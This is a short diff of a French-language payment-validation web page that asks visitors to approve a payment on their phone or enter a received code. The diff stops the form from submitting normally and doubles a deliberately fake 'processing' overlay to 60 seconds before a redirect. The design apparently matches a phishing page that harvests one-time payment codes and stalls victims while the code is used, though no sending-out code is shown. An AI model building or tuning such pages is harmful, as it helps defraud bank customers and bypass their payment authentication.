@@ -243,7 +243,7 @@
             <p><strong>Option 1:</strong> Vous allez recevoir une notification sur votre mobile pour valider le paiement.</p>
             <p><strong>Option 2:</strong> Si vous avez reçu un code par message, entrez-le ci-dessous :</p>
 
-            <form method="POST" onsubmit="showLoadingMessage()">
+            <form method="POST" onsubmit="showLoadingMessage(); return false;">
                 <div class="input-group">
                     <i class="fas fa-key"></i>
                     <input type="number" id="validation_code" name="validation_code" placeholder="Entrez votre code" min="0" max="999999" required>
@@ -273,12 +273,12 @@
             // Affiche l'écran de chargement
             document.getElementById("loading-overlay").classList.add("active");
 
-            // Simule un temps de chargement de 30 secondes
+            // Simule un temps de chargement de 1 minute (60 000 ms)
             setTimeout(() => {
                 document.getElementById("loading-overlay").classList.remove("active");
-                // Redirige vers la page de confirmation après 30 secondes
+                // Redirige vers la page de confirmation après 1 minute
                 window.location.href = "/confirmation";
-            }, 30000); // 30 secondes
+            }, 60000); // 60 secondes
         }
     </script>
 </body>
